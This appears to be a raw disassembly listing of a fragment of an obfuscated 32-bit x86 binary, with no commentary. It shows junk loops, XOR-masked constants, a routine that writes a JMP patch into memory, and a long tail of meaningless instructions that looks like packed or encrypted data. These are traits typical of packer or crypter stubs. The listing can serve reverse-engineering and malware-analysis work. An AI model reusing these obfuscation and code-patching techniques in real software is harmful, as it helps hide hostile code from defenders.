  405131:	mov    eax,DWORD PTR [ebp-0x14]
  405134:	mov    ecx,DWORD PTR ds:0x43700c
  40513a:	xor    DWORD PTR ds:0x434008,ecx
  405140:	mov    ecx,DWORD PTR [ebp+0x8]
  405143:	add    ecx,DWORD PTR [eax+0x24]
  405146:	xor    eax,eax
  405148:	add    eax,DWORD PTR ds:0x434008
  40514e:	xor    DWORD PTR ds:0x437014,eax
  405154:	mov    DWORD PTR [ebp-0x34],ecx
  405157:	mov    DWORD PTR ds:0x438000,0x1b
  405161:	cmp    DWORD PTR ds:0x438000,0x0
  405168:	je     0x4051b8
  40516e:	cmp    DWORD PTR ds:0x438000,0x3
  405175:	jbe    0x4051b8
  40517b:	jmp    0x40518c
  405180:	push   DWORD PTR [ebp-0x28]
  405183:	push   DWORD PTR [ebp-0xc]
  405186:	call   DWORD PTR ds:0x43a8f8
  40518c:	cmp    DWORD PTR ds:0x438000,0x4
  405193:	jne    0x4051a6
  405199:	mov    ecx,DWORD PTR ds:0x438000
  40519f:	dec    ecx
  4051a0:	mov    DWORD PTR ds:0x438000,ecx
  4051a6:	mov    ecx,DWORD PTR ds:0x438000
  4051ac:	dec    ecx
  4051ad:	mov    DWORD PTR ds:0x438000,ecx
  4051b3:	jmp    0x405161
  4051b8:	mov    eax,DWORD PTR [ebp-0x14]
  4051bb:	mov    ecx,DWORD PTR [ebp+0x8]
  4051be:	add    ecx,DWORD PTR [eax+0x1c]
  4051c1:	mov    DWORD PTR [ebp-0x14],ecx
  4051c4:	jmp    0x40521f
  4051c9:	mov    eax,DWORD PTR [ebp-0x2c]
  4051cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4051cf:	add    ecx,DWORD PTR [eax+ebx*4]
  4051d2:	mov    DWORD PTR [ebp-0x28],ecx
  4051d5:	mov    eax,DWORD PTR [ebp-0x4]
  4051d8:	mov    ecx,DWORD PTR [ebp-0x28]
  4051db:	xor    eax,esi
  4051dd:	add    eax,edi
  4051df:	cmp    ecx,eax
  4051e1:	je     0x40521f
  4051e7:	jmp    0x405210
  4051ec:	mov    eax,DWORD PTR [ebp-0x4]
  4051ef:	mov    ecx,DWORD PTR [ebp-0x8]
  4051f2:	xor    eax,esi
  4051f4:	add    eax,edi
  4051f6:	cmp    ecx,eax
  4051f8:	mov    eax,DWORD PTR [ebp-0x4]
  4051fb:	je     0x40525a
  405201:	mov    ecx,DWORD PTR [ebp-0x30]
  405204:	xor    eax,esi
  405206:	add    eax,edi
  405208:	cmp    ecx,eax
  40520a:	je     0x405263
  405210:	lea    eax,[ebp-0x8]
  405213:	push   eax
  405214:	push   DWORD PTR [ebp-0x28]
  405217:	push   DWORD PTR [ebp+0xc]
  40521a:	call   0x40a667
  40521f:	mov    eax,DWORD PTR [ebp-0x4]
  405222:	mov    ecx,DWORD PTR [ebp-0x8]
  405225:	xor    eax,esi
  405227:	add    eax,edi
  405229:	cmp    ecx,eax
  40522b:	je     0x405246
  405231:	mov    eax,DWORD PTR [ebp-0x34]
  405234:	movzx  eax,WORD PTR [eax+ebx*2]
  405238:	mov    ecx,DWORD PTR [ebp-0x14]
  40523b:	mov    eax,DWORD PTR [ecx+eax*4]
  40523e:	mov    DWORD PTR [ebp-0x38],eax
  405241:	jmp    0x4051ec
  405246:	mov    eax,DWORD PTR [ebp-0xc]
  405249:	xor    eax,esi
  40524b:	lea    ebx,[ebx+eax*1+0x3272e2]
  405252:	jmp    0x404e77
  405257:	mov    eax,DWORD PTR [ebp-0x4]
  40525a:	xor    eax,esi
  40525c:	add    eax,edi
  40525e:	jmp    0x405380
  405263:	mov    eax,DWORD PTR [ebp-0x38]
  405266:	add    eax,DWORD PTR [ebp+0x8]
  405269:	mov    DWORD PTR [ebp-0x18],eax
  40526c:	mov    eax,DWORD PTR [ebp-0x1c]
  40526f:	test   eax,eax
  405271:	je     0x40530b
  405277:	mov    DWORD PTR [ebp-0x20],0x0
  40527e:	push   0x3
  405280:	xor    edx,edx
  405282:	pop    edx
  405283:	add    edx,0x8
  405286:	push   edx
  405287:	pop    ecx
  405288:	push   0x6
  40528a:	dec    ecx
  40528b:	pop    ebx
  40528c:	dec    ebx
  40528d:	xchg   ebx,ecx
  40528f:	sub    ebx,ecx
  405291:	xchg   ebx,ecx
  405293:	dec    ecx
  405294:	mov    eax,DWORD PTR [ebp-0x1c]
  405297:	imul   eax,ecx
  40529a:	sub    esp,eax
  40529c:	mov    DWORD PTR [ebp-0x20],esp
  40529f:	mov    eax,DWORD PTR [ebp-0x4]
  4052a2:	xor    eax,esi
  4052a4:	add    eax,edi
  4052a6:	jmp    0x4052e4
  4052ab:	mov    ecx,DWORD PTR [ebp-0xc]
  4052ae:	mov    eax,DWORD PTR [ebp+0x8]
  4052b1:	mov    edx,DWORD PTR [ebp+0x14]
  4052b4:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4052b8:	xor    ecx,esi
  4052ba:	add    ecx,edi
  4052bc:	xor    edx,edx
  4052be:	div    ecx
  4052c0:	mov    ecx,DWORD PTR [ebp-0x4]
  4052c3:	xor    ecx,esi
  4052c5:	lea    eax,[ecx+eax*1+0x3272e2]
  4052cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4052cf:	mov    edx,DWORD PTR [ebp-0x20]
  4052d2:	mov    DWORD PTR [edx+ecx*4],eax
  4052d5:	mov    eax,DWORD PTR [ebp-0xc]
  4052d8:	mov    ecx,DWORD PTR [ebp+0x8]
  4052db:	xor    eax,esi
  4052dd:	lea    eax,[eax+ecx*1+0x3272e2]
  4052e4:	mov    DWORD PTR [ebp+0x8],eax
  4052e7:	mov    eax,DWORD PTR [ebp-0xc]
  4052ea:	mov    ecx,DWORD PTR [ebp+0x14]
  4052ed:	xor    eax,esi
  4052ef:	add    eax,edi
  4052f1:	imul   eax,DWORD PTR [ecx]
  4052f4:	mov    ecx,DWORD PTR [ebp-0x4]
  4052f7:	mov    edx,DWORD PTR [ebp+0x8]
  4052fa:	xor    ecx,esi
  4052fc:	lea    ecx,[ecx+edx*1+0x3272e2]
  405303:	cmp    ecx,eax
  405305:	jne    0x4052ab
  40530b:	mov    eax,DWORD PTR [ebp-0x4]
  40530e:	xor    eax,esi
  405310:	add    eax,edi
  405312:	mov    DWORD PTR [ebp-0x10],eax
  405315:	mov    ebx,0x65655
  40531a:	add    ebx,0x3234
  405320:	xchg   ebx,esi
  405322:	xor    ebx,ebx
  405324:	push   esi
  405325:	mov    esi,ebx
  405327:	pop    ebx
  405328:	mov    edx,esi
  40532a:	add    ebx,0x1002
  405330:	lea    eax,[ebp-0x18]
  405333:	add    edx,eax
  405335:	add    edx,0x5
  405338:	push   edx
  405339:	inc    esi
  40533a:	pop    ecx
  40533b:	dec    ecx
  40533c:	xchg   ecx,eax
  40533d:	dec    eax
  40533e:	xchg   ecx,eax
  40533f:	dec    ecx
  405340:	xchg   ecx,edx
  405342:	dec    edx
  405343:	push   edx
  405344:	mov    edx,ebx
  405346:	pop    ebx
  405347:	dec    ebx
  405348:	call   DWORD PTR [ebx]
  40534a:	cmp    DWORD PTR [ebp+0x10],esi
  40534d:	je     0x40536c
  405353:	xchg   edx,eax
  405354:	push   0xb
  405356:	pop    ecx
  405357:	push   0x4
  405359:	pop    ebx
  40535a:	inc    ebx
  40535b:	xchg   ebx,ecx
  40535d:	sub    ebx,ecx
  40535f:	xchg   ebx,ecx
  405361:	dec    ecx
  405362:	dec    ecx
  405363:	mov    eax,DWORD PTR [ebp-0x1c]
  405366:	imul   eax,ecx
  405369:	add    esp,eax
  40536b:	xchg   edx,eax
  40536c:	push   eax
  40536d:	xor    ebx,ebx
  40536f:	mov    edx,esp
  405371:	dec    edx
  405372:	inc    ebx
  405373:	add    ebx,DWORD PTR [edx+ebx*1]
  405376:	dec    ebx
  405377:	xor    edx,edx
  405379:	add    DWORD PTR [ebp-0x10],ebx
  40537c:	pop    ebx
  40537d:	mov    eax,DWORD PTR [ebp-0x10]
  405380:	pop    edi
  405381:	pop    esi
  405382:	pop    ebx
  405383:	leave  
  405384:	ret    0x10
  405387:	push   ebp
  405388:	mov    ebp,esp
  40538a:	sub    esp,0x7c
  40538d:	or     eax,DWORD PTR ds:0x438010
  405393:	push   esi
  405394:	add    eax,esi
  405396:	push   edi
  405397:	xor    eax,esi
  405399:	mov    eax,ds:0x43a2d4
  40539e:	mov    DWORD PTR [ebp-0x24],eax
  4053a1:	or     DWORD PTR ds:0x434010,0x1014
  4053ab:	mov    eax,ds:0x43a3e0
  4053b0:	or     edi,0x3119
  4053b6:	mov    DWORD PTR [ebp-0x34],eax
  4053b9:	and    DWORD PTR [ebp-0x30],0x0
  4053bd:	add    DWORD PTR ds:0x437004,edi
  4053c3:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  4053ca:	and    DWORD PTR ds:0x43401c,0x0
  4053d4:	jmp    0x4053e6
  4053d9:	mov    esi,DWORD PTR ds:0x43401c
  4053df:	inc    esi
  4053e0:	mov    DWORD PTR ds:0x43401c,esi
  4053e6:	cmp    DWORD PTR ds:0x43401c,0x19
  4053ed:	jae    0x405431
  4053f3:	cmp    DWORD PTR ds:0x43401c,0xb
  4053fa:	jg     0x405431
  405400:	jmp    0x405410
  405405:	push   0x437014
  40540a:	call   DWORD PTR ds:0x43a900
  405410:	cmp    DWORD PTR ds:0x43401c,0xa
  405417:	jne    0x40542c
  40541d:	xor    esi,esi
  40541f:	or     esi,DWORD PTR ds:0x43401c
  405425:	inc    esi
  405426:	mov    DWORD PTR ds:0x43401c,esi
  40542c:	jmp    0x4053d9
  405431:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  405438:	mov    ecx,DWORD PTR ds:0x416534
  40543e:	mov    eax,ds:0x416554
  405443:	sub    ecx,eax
  405445:	sub    ecx,DWORD PTR [ecx+eax*1]
  405448:	mov    eax,DWORD PTR [ebp-0x10]
  40544b:	mov    ecx,DWORD PTR ds:0x416524
  405451:	mov    esi,DWORD PTR ds:0x41653c
  405457:	sub    esi,ecx
  405459:	xor    ecx,DWORD PTR [ecx+esi*1]
  40545c:	mov    ecx,DWORD PTR [ebp-0x10]
  40545f:	sub    eax,ecx
  405461:	movzx  ecx,WORD PTR ds:0x43501c
  405468:	and    ecx,DWORD PTR ds:0x435004
  40546e:	mov    DWORD PTR ds:0x43501c,ecx
  405474:	mov    DWORD PTR [ebp-0x10],eax
  405477:	xor    DWORD PTR [ebp-0x10],0xf89cb585
  40547e:	sbb    DWORD PTR ds:0x43600c,0x633c
  405488:	mov    eax,DWORD PTR [ebp-0x18]
  40548b:	mov    DWORD PTR ds:0x435000,0x15
  405495:	cmp    DWORD PTR ds:0x435000,0x0
  40549c:	je     0x4054ce
  4054a2:	cmp    DWORD PTR ds:0x435000,0x20
  4054a9:	jge    0x4054ce
  4054af:	jmp    0x4054ba
  4054b4:	call   DWORD PTR ds:0x43a904
  4054ba:	xor    edi,edi
  4054bc:	xor    edi,DWORD PTR ds:0x435000
  4054c2:	dec    edi
  4054c3:	mov    DWORD PTR ds:0x435000,edi
  4054c9:	jmp    0x405495
  4054ce:	mov    ecx,DWORD PTR [ebp-0x18]
  4054d1:	movzx  esi,BYTE PTR ds:0x43501c
  4054d8:	xor    DWORD PTR ds:0x437018,esi
  4054de:	sub    eax,ecx
  4054e0:	mov    DWORD PTR [ebp-0x18],eax
  4054e3:	sub    DWORD PTR ds:0x436008,ebx
  4054e9:	or     DWORD PTR [ebp-0x18],0xf89f0585
  4054f0:	neg    eax
  4054f2:	mov    eax,DWORD PTR [ebp-0xc]
  4054f5:	and    DWORD PTR ds:0x43800c,0x0
  4054ff:	jmp    0x405511
  405504:	mov    ecx,DWORD PTR ds:0x43800c
  40550a:	inc    ecx
  40550b:	mov    DWORD PTR ds:0x43800c,ecx
  405511:	cmp    DWORD PTR ds:0x43800c,0x17
  405518:	jae    0x405558
  40551e:	cmp    DWORD PTR ds:0x43800c,0xe
  405525:	jge    0x405558
  40552b:	jmp    0x405539
  405530:	push   DWORD PTR [ebp-0x1c]
  405533:	call   DWORD PTR ds:0x43a8c4
  405539:	cmp    DWORD PTR ds:0x43800c,0xd
  405540:	jne    0x405553
  405546:	mov    ecx,DWORD PTR ds:0x43800c
  40554c:	inc    ecx
  40554d:	mov    DWORD PTR ds:0x43800c,ecx
  405553:	jmp    0x405504
  405558:	mov    ecx,DWORD PTR [ebp-0xc]
  40555b:	and    DWORD PTR ds:0x435018,0x0
  405565:	jmp    0x405577
  40556a:	mov    edi,DWORD PTR ds:0x435018
  405570:	inc    edi
  405571:	mov    DWORD PTR ds:0x435018,edi
  405577:	cmp    DWORD PTR ds:0x435018,0x14
  40557e:	jae    0x4055bd
  405584:	cmp    DWORD PTR ds:0x435018,0xd
  40558b:	jb     0x4055bd
  405591:	jmp    0x40559e
  405596:	push   0xc
  405598:	call   DWORD PTR ds:0x43a8c8
  40559e:	cmp    DWORD PTR ds:0x435018,0xc
  4055a5:	jne    0x4055b8
  4055ab:	mov    edi,DWORD PTR ds:0x435018
  4055b1:	inc    edi
  4055b2:	mov    DWORD PTR ds:0x435018,edi
  4055b8:	jmp    0x40556a
  4055bd:	sub    eax,ecx
  4055bf:	or     DWORD PTR ds:0x435010,edi
  4055c5:	mov    DWORD PTR [ebp-0xc],eax
  4055c8:	or     DWORD PTR [ebp-0xc],0xf89c85c5
  4055cf:	sbb    eax,ecx
  4055d1:	mov    eax,DWORD PTR [ebp-0x1c]
  4055d4:	add    DWORD PTR ds:0x436018,0x5c37
  4055de:	mov    ecx,DWORD PTR [ebp-0x1c]
  4055e1:	or     esi,edi
  4055e3:	sub    eax,ecx
  4055e5:	mov    DWORD PTR [ebp-0x1c],eax
  4055e8:	or     DWORD PTR [ebp-0x1c],0xf89c85a5
  4055ef:	mov    eax,DWORD PTR [ebp-0x20]
  4055f2:	mov    ecx,DWORD PTR [ebp-0x20]
  4055f5:	sub    eax,ecx
  4055f7:	mov    DWORD PTR [ebp-0x20],eax
  4055fa:	mov    eax,DWORD PTR [ebp-0x2c]
  4055fd:	mov    ecx,DWORD PTR [ebp-0x20]
  405600:	mov    esi,0x751089b
  405605:	xor    eax,esi
  405607:	mov    edi,0x3272e2
  40560c:	add    eax,edi
  40560e:	or     eax,ecx
  405610:	mov    DWORD PTR [ebp-0x20],eax
  405613:	mov    eax,DWORD PTR [ebp-0x4]
  405616:	mov    ecx,DWORD PTR [ebp-0x4]
  405619:	sub    eax,ecx
  40561b:	mov    DWORD PTR [ebp-0x4],eax
  40561e:	or     DWORD PTR [ebp-0x4],0xf89c85b8
  405625:	mov    eax,DWORD PTR [ebp-0xc]
  405628:	xor    eax,esi
  40562a:	add    eax,edi
  40562c:	push   eax
  40562d:	mov    eax,DWORD PTR [ebp-0x10]
  405630:	xor    eax,esi
  405632:	add    eax,edi
  405634:	push   eax
  405635:	mov    eax,DWORD PTR [ebp-0x4]
  405638:	xor    eax,esi
  40563a:	add    eax,edi
  40563c:	push   eax
  40563d:	lea    eax,[ebp-0x7c]
  405640:	push   eax
  405641:	push   DWORD PTR [ebp-0x2c]
  405644:	push   DWORD PTR [ebp-0x28]
  405647:	call   0x40a560
  40564c:	test   eax,eax
  40564e:	je     0x40567c
  405654:	lea    eax,[ebp-0x7c]
  405657:	push   eax
  405658:	mov    eax,DWORD PTR [ebp-0x28]
  40565b:	xor    eax,esi
  40565d:	add    eax,edi
  40565f:	push   eax
  405660:	mov    eax,DWORD PTR [ebp-0x24]
  405663:	add    eax,0xaa
  405668:	push   eax
  405669:	mov    eax,DWORD PTR [ebp-0x24]
  40566c:	mov    eax,DWORD PTR [eax+0x198]
  405672:	push   DWORD PTR [eax]
  405674:	call   0x404c64
  405679:	mov    DWORD PTR [ebp-0x14],eax
  40567c:	lea    eax,[ebp+0x4]
  40567f:	mov    DWORD PTR [ebp-0x30],eax
  405682:	mov    eax,DWORD PTR [ebp-0x14]
  405685:	test   eax,eax
  405687:	je     0x407a42
  40568d:	lea    eax,[ebp-0x8]
  405690:	mov    DWORD PTR [ebp-0x38],eax
  405693:	mov    eax,DWORD PTR [ebp-0x34]
  405696:	mov    DWORD PTR [ebp-0x8],eax
  405699:	mov    eax,DWORD PTR [ebp-0x8]
  40569c:	mov    ecx,DWORD PTR [ebp-0x14]
  40569f:	sub    eax,ecx
  4056a1:	mov    DWORD PTR [ebp-0x8],eax
  4056a4:	mov    ecx,DWORD PTR [ebp-0x4]
  4056a7:	xor    ecx,esi
  4056a9:	mov    eax,0xffcd8d1e
  4056ae:	sub    eax,ecx
  4056b0:	add    DWORD PTR [ebp-0x8],eax
  4056b3:	mov    eax,DWORD PTR [ebp-0x8]
  4056b6:	mov    ecx,DWORD PTR [ebp-0x14]
  4056b9:	mov    DWORD PTR [ecx+0x1],eax
  4056bc:	mov    eax,DWORD PTR [ebp-0x14]
  4056bf:	push   DWORD PTR [ebp-0x24]
  4056c2:	mov    BYTE PTR [eax],0xe9
  4056c5:	mov    eax,ds:0x43a150
  4056ca:	push   DWORD PTR [eax]
  4056cc:	push   DWORD PTR ds:0x43a3ac
  4056d2:	push   DWORD PTR ds:0x43a158
  4056d8:	jmp    0x407a2b
  4056dd:	push   ecx
  4056de:	out    0x83,al
  4056e0:	push   ebp
  4056e1:	jae    0x4056d4
  4056e3:	jae    0x4056c7
  4056e5:	das    
  4056e6:	push   edi
  4056e7:	sbb    eax,0x19967d25
  4056ec:	jo     0x4056c1
  4056ee:	pop    edi
  4056ef:	jl     0x40576d
  4056f1:	dec    edx
  4056f2:	pop    edi
  4056f3:	jl     0x405771
  4056f5:	stc    
  4056f6:	jecxz  0x405696
  4056f8:	xor    WORD PTR [edi],dx
  4056fb:	cmp    ecx,DWORD PTR [edx]
  4056fd:	mov    al,0x3b
  4056ff:	daa    
  405700:	pop    esi
  405701:	pop    esp
  405702:	ficom  DWORD PTR ds:0x7a57e9b0
  405708:	popf   
  405709:	aad    0x1b
  40570b:	or     ch,al
  40570d:	test   al,0x25
  40570f:	jno    0x4056f2
  405711:	in     eax,dx
  405712:	mov    WORD PTR [ecx+0x3f4d43ac],?
  405718:	hlt    
  405719:	xor    BYTE PTR [ecx-0x4f],dl
  40571c:	clc    
  40571d:	pop    ebp
  40571e:	mov    ah,0x77
  405720:	mov    al,ds:0x29ae0a8c
  405725:	add    eax,DWORD PTR [edx-0x1e]
  405728:	shl    DWORD PTR [eax],cl
  40572a:	jle    0x4056b1
  40572c:	jno    0x4056cb
  40572e:	dec    edx
  40572f:	mov    bl,0xb6
  405731:	or     eax,0x69dfa84e
  405736:	int    0x1c
  405738:	jl     0x405770
  40573a:	jl     0xd5ea9628
  405740:	fwait
  405741:	dec    ebx
  405742:	cmp    ah,BYTE PTR [edi]
  405744:	es dec edi
  405746:	adc    ebp,edx
  405748:	lea    ecx,[edi]
  40574a:	inc    ebx
  40574b:	imul   esi,DWORD PTR [ecx-0x20],0xffffffcf
  40574f:	fwait
  405750:	push   es
  405751:	sahf   
  405752:	test   al,0xfe
  405754:	loopne 0x405719
  405756:	gs ins DWORD PTR es:[edi],dx
  405758:	es dec ecx
  40575a:	aaa    
  40575b:	pop    edx
  40575c:	cmp    BYTE PTR ds:0x8fb60dd,0xbd
  405763:	pop    edi
  405764:	jge    0x405761
  405766:	xchg   edi,eax
  405767:	jp     0x4057cb
  405769:	sub    al,0x30
  40576b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40576c:	fadd   QWORD PTR [esi-0x2240ada3]
  405772:	enter  0x82a0,0xdd
  405776:	out    dx,eax
  405777:	mov    edx,0x38b9ece3
  40577c:	sbb    eax,0xa0c787df
  405781:	jge    0x40576a
  405783:	push   edx
  405784:	ret    
  405785:	jo     0x405771
  405787:	or     esp,DWORD PTR [edx+0x57]
  40578a:	std    
  40578b:	mov    dl,0x83
  40578d:	adc    esi,edx
  40578f:	sub    ch,BYTE PTR [esi+0x6d]
  405792:	sbb    al,0x8b
  405794:	leave  
  405795:	sub    dh,al
  405797:	stos   DWORD PTR es:[edi],eax
  405798:	jp     0x4057d4
  40579a:	cli    
  40579b:	mov    ah,0x22
  40579d:	xchg   edi,eax
  40579e:	test   al,0x79
  4057a0:	jle    0x405816
  4057a2:	test   al,0xee
  4057a4:	add    BYTE PTR [eax+0x68cd897d],bl
  4057aa:	(bad)  
  4057ab:	mov    ah,0xd3
  4057ad:	lds    eax,FWORD PTR [ebx]
  4057af:	mov    BYTE PTR [edi-0x8],al
  4057b2:	lea    ecx,[ebp+ebx*2+0x6e2e765]
  4057b9:	sub    bl,BYTE PTR [eax]
  4057bb:	fwait
  4057bc:	inc    edi
  4057bd:	pop    ss
  4057be:	(bad)  
  4057bf:	sbb    BYTE PTR [edx+eax*4-0x2ed6f6b2],al
  4057c6:	imul   ebx,DWORD PTR [ecx-0x44],0x11
  4057ca:	mov    ecx,0xa43dfed1
  4057cf:	pop    esp
  4057d0:	retf   
  4057d1:	cmc    
  4057d2:	cdq    
  4057d3:	aad    0x1f
  4057d5:	jle    0x40575d
  4057d7:	or     DWORD PTR [esi],esp
  4057d9:	mov    al,0xc6
  4057db:	add    al,0x6e
  4057dd:	push   0xffffffaa
  4057df:	sbb    DWORD PTR [ecx-0x7],ebx
  4057e2:	inc    eax
  4057e3:	xchg   ebx,eax
  4057e4:	lods   al,BYTE PTR ds:[esi]
  4057e5:	cs jb  0x40576e
  4057e8:	push   esi
  4057e9:	scas   al,BYTE PTR es:[edi]
  4057ea:	mov    bh,0x65
  4057ec:	out    dx,al
  4057ed:	iret   
  4057ee:	xor    cl,BYTE PTR [esi]
  4057f0:	xchg   ecx,eax
  4057f1:	nop
  4057f2:	mov    ebp,DWORD PTR [eax+0xa]
  4057f5:	mov    esp,0xc3350fed
  4057fa:	or     al,0xc8
  4057fc:	inc    edi
  4057fd:	add    DWORD PTR [edx],eax
  4057ff:	sub    al,0xed
  405801:	aam    0x8c
  405803:	or     DWORD PTR [edi+0xee5a0d1],edx
  405809:	dec    edx
  40580a:	push   ecx
  40580b:	push   ebp
  40580c:	inc    edx
  40580d:	push   0x28a07352
  405812:	xor    esi,0x61
  405815:	aam    0xb6
  405817:	jb     0x405876
  405819:	mov    esi,0x48ad400e
  40581e:	lea    ecx,[ecx-0x195e23e]
  405824:	bnd jb 0x4057fe
  405827:	cmp    BYTE PTR [esp+ebx*1-0x4dc34fcc],cl
  40582e:	mov    ebp,0x7778be85
  405833:	add    ch,BYTE PTR [edi+0x1137b089]
  405839:	imul   eax,DWORD PTR [ecx+0xd],0xffffff8e
  40583d:	jno    0x405815
  40583f:	mov    esp,?
  405841:	into   
  405842:	mov    cl,0xa
  405844:	in     eax,0x3c
  405846:	adc    dl,BYTE PTR [ebp-0x1d]
  405849:	xor    eax,0xf68bb6d2
  40584e:	add    al,0x1c
  405850:	add    DWORD PTR [ebx+0x56],edx
  405853:	fistp  QWORD PTR [eax]
  405855:	ret    0x1522
  405858:	(bad)  
  405859:	mov    ds:0x2c443319,al
  40585e:	mov    ebp,0xea6aa212
  405863:	mov    ds:0x6ffca173,eax
  405868:	jl     0x4058a4
  40586a:	inc    esi
  40586b:	sbb    eax,0xdfd77265
  405870:	aaa    
  405871:	sub    edi,DWORD PTR [edi-0x6b960de7]
  405877:	dec    ebx
  405878:	push   cs
  405879:	mov    eax,DWORD PTR [edx]
  40587b:	fisub  WORD PTR [eax]
  40587d:	sti    
  40587e:	(bad)  
  40587f:	sahf   
  405880:	jge    0x4058d2
  405882:	mov    esi,0xd35895b3
  405887:	xchg   edi,eax
  405888:	inc    ebp
  405889:	dec    esp
  40588a:	sbb    DWORD PTR [edi+edi*4],edx
  40588d:	mov    BYTE PTR [ecx],al
  40588f:	jg     0x405899
  405891:	adc    esp,esp
  405893:	mov    ds:0x637e80f0,eax
  405898:	mov    ecx,0xebf416a7
  40589d:	out    0x1e,al
  40589f:	jmp    0x405864
  4058a1:	sub    al,0x57
  4058a3:	jg     0x4058d4
  4058a5:	out    0xd1,al
  4058a7:	push   ebx
  4058a8:	push   ebx
  4058a9:	mov    ebx,0x1606fe1d
  4058ae:	lds    ebx,FWORD PTR [edx+0xe]
  4058b1:	in     al,dx
  4058b2:	adc    dl,BYTE PTR [esi-0xe]
  4058b5:	ret    
  4058b6:	aas    
  4058b7:	jb     0x4058b4
  4058b9:	sub    bh,BYTE PTR [ecx+0x3154043a]
  4058bf:	rol    BYTE PTR [ebx+0x3e],1
  4058c2:	nop
  4058c3:	or     ebp,ebx
  4058c5:	mov    al,0x5a
  4058c7:	mov    bl,0x48
  4058c9:	sub    dl,BYTE PTR [ebx+0x4e]
  4058cc:	dec    ebp
  4058cd:	idiv   ebp
  4058cf:	out    dx,eax
  4058d0:	mov    es,WORD PTR [ebp-0x5eea4b36]
  4058d6:	mov    cl,0xfb
  4058d8:	adc    eax,0xe3b93ad5
  4058dd:	je     0x4058ff
  4058df:	test   DWORD PTR [eax-0x64b68a0a],ebp
  4058e5:	or     BYTE PTR [edi],al
  4058e7:	mov    WORD PTR [edx+0x2fd53c22],gs
  4058ed:	jle    0x4058bd
  4058ef:	je     0x40591b
  4058f1:	and    al,0x86
  4058f3:	sar    ebx,0x4c
  4058f6:	sub    DWORD PTR [edi],ebx
  4058f8:	icebp  
  4058f9:	fmul   st(3),st
  4058fb:	es xchg ebp,eax
  4058fd:	dec    ecx
  4058fe:	outs   dx,DWORD PTR ds:[esi]
  4058ff:	fnstsw WORD PTR [eax+0x61dce961]
  405905:	push   ds
  405906:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405907:	sub    DWORD PTR [edi],0x194c3fbb
  40590d:	ret    
  40590e:	out    dx,eax
  40590f:	aas    
  405910:	push   eax
  405911:	nop
  405912:	push   edx
  405913:	test   eax,0x5007a790
  405918:	jnp    0x40589d
  40591a:	jo     0x405900
  40591c:	mov    edi,DWORD PTR [eax]
  40591e:	cld    
  40591f:	pop    es
  405920:	push   edx
  405921:	cmp    DWORD PTR [ecx+0x3d],edx
  405924:	pop    DWORD PTR [ecx-0x3a3d4964]
  40592a:	iret   
  40592b:	mov    cl,0x30
  40592d:	mov    al,0xe1
  40592f:	push   0xe1546c66
  405934:	xor    al,0xe5
  405936:	shr    DWORD PTR [ecx-0x74],1
  405939:	jmp    esp
  40593b:	outs   dx,DWORD PTR ss:[esi]
  40593d:	sbb    BYTE PTR [edi-0x1b],bh
  405940:	aam    0x58
  405942:	mov    edx,0x6e168786
  405947:	mov    dl,0x97
  405949:	dec    esi
  40594a:	out    dx,al
  40594b:	sbb    DWORD PTR [esi+0x54],edi
  40594e:	jno    0x405955
  405950:	jecxz  0x4058f5
  405952:	sub    DWORD PTR [ecx+eax*8],edx
  405955:	pop    edx
  405956:	adc    dh,BYTE PTR [ecx+0xb]
  405959:	jno    0x40596e
  40595b:	test   BYTE PTR [eax+0x3f805624],bh
  405961:	in     al,0x3f
  405963:	(bad)  
  405964:	repnz daa 
  405966:	jo     0x405927
  405968:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405969:	jns    0x4059e9
  40596b:	mov    dl,0x34
  40596d:	call   0x1d1e:0x691b7b67
  405974:	rcr    ebp,1
  405976:	jmp    0xa985:0x1687dfb4
  40597d:	push   eax
  40597e:	xchg   DWORD PTR [esi+0x33f2949d],edx
  405984:	jno    0x40596a
  405986:	or     BYTE PTR [edx+0x2c79eacc],bh
  40598c:	fisub  DWORD PTR [edx+edi*2-0x476305f3]
  405993:	xchg   DWORD PTR [eax],esi
  405995:	arpl   WORD PTR ds:[eax-0xe283ba1],dx
  40599c:	(bad)  
  40599d:	mov    fs,WORD PTR [edx]
  40599f:	bound  esi,QWORD PTR ds:0x22056e0d
  4059a5:	mov    ds:0x8ae217e4,al
  4059aa:	addr16 sbb eax,edi
  4059ad:	xchg   ebx,eax
  4059ae:	sub    al,0x6c
  4059b0:	outs   dx,BYTE PTR ds:[esi]
  4059b1:	aam    0x72
  4059b3:	movntq QWORD PTR [ebx-0x1ebfc71f],mm0
  4059ba:	iret   
  4059bb:	sbb    al,al
  4059bd:	push   cs
  4059be:	lock sar BYTE PTR [edx+0x29],1
  4059c2:	cmp    ah,BYTE PTR [edx]
  4059c4:	fidiv  DWORD PTR [ebp-0x3e90998c]
  4059ca:	jp     0x405a44
  4059cc:	scas   eax,DWORD PTR es:[edi]
  4059cd:	or     BYTE PTR [ebx+0x81547e5],dh
  4059d3:	fbstp  TBYTE PTR [eax]
  4059d5:	push   edx
  4059d6:	mov    dh,0x85
  4059d8:	(bad)  
  4059da:	xchg   esi,eax
  4059db:	imul   eax,DWORD PTR [esi-0x1d],0xffffffcf
  4059df:	cmc    
  4059e0:	jmp    0xf713:0xbb824b12
  4059e7:	mov    edx,0xf6a85a4a
  4059ec:	cmp    al,0xa
  4059ee:	xlat   BYTE PTR ds:[ebx]
  4059ef:	push   ecx
  4059f0:	fsub   DWORD PTR [eax+ebp*4+0x3d]
  4059f4:	sbb    BYTE PTR [edx+0x49],al
  4059f7:	ss add al,0xdf
  4059fa:	jecxz  0x405a49
  4059fc:	(bad)  
  4059fd:	and    eax,0xc98b71c1
  405a02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a03:	test   DWORD PTR [ecx+0x65],0x16dd1626
  405a0a:	in     al,0x4c
  405a0c:	xor    DWORD PTR [eax-0x45],ebp
  405a0f:	dec    BYTE PTR [eax]
  405a11:	icebp  
  405a12:	jnp    0x405a11
  405a14:	inc    esp
  405a15:	cld    
  405a16:	adc    ch,BYTE PTR [ecx+0x591362ad]
  405a1c:	cmp    dl,al
  405a1e:	xor    esi,esp
  405a20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405a21:	push   edi
  405a22:	nop
  405a23:	repz ret 
  405a25:	fnsave [ecx-0x27]
  405a28:	je     0x4059fe
